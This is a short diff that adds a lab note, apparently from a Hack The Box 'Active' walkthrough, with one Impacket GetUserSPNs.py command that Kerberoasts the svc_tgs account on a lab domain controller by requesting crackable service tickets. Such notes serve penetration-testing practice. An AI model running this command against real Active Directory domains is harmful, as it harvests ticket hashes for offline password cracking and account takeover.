@@ -1,0 +1,4 @@
+
+Get SPN Users and Request the TGS:
+GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
+
